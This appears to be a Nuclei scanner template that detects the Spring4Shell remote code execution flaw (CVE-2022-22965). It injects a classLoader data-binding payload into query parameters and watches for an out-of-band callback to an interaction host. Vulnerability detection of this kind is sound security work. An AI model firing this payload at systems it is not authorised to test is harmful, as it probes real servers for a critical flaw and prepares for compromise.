http:
- fuzzing:
  - fuzz:
    - '{{nix_fuzz}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - case-insensitive: true
    part: interactsh_request
    type: word
    words:
    - 'User-Agent: Java'
  matchers-condition: and
  payloads:
    nix_fuzz:
    - class.module.classLoader.resources.context.configFile=http://{{interactsh-url}}
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
id: spring4shell-CVE-2022-22965
info:
  author: DhiyaneshDK,ritikchaddha
  classification:
    cpe: cpe:2.3:a:vmware:spring_framework:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-22965
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.99988
    epss-score: 0.94441
  description: 'A Spring MVC or Spring WebFlux application running on JDK 9+ may be
    vulnerable to remote code execution (RCE) via data binding. The specific exploit
    requires the application to run on Tomcat as a WAR deployment. If the application
    is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable
    to the exploit. However, the nature of the vulnerability is more general, and
    there may be other ways to exploit it.

    '
  impact: 'Attackers can achieve remote code execution on Spring applications running
    on JDK 9+ and Tomcat through data binding exploitation, potentially compromising
    the entire application server.

    '
  metadata:
    max-request: 1
    product: spring_framework
    vendor: vmware
  name: Spring Framework RCE via Data Binding on JDK 9+
  reference:
  - https://spring.io/security/cve-2022-22965
  - https://pentest-tools.com/blog/detect-exploit-spring4shell-cve-2022-22965
  - http://packetstormsecurity.com/files/167011/Spring4Shell-Spring-Framework-Class-Property-Remote-Code-Execution.html
  - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2022-0005
  - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-java-spring-rce-Zx9GUc67
  remediation: 'Upgrade Spring Framework to versions 5.3.18, 5.2.20, or later that
    properly validate class property access during data binding.

    '
  severity: critical
  tags: packetstorm,cve,cve2024,dast,spring,rce,kev,vkev,vuln
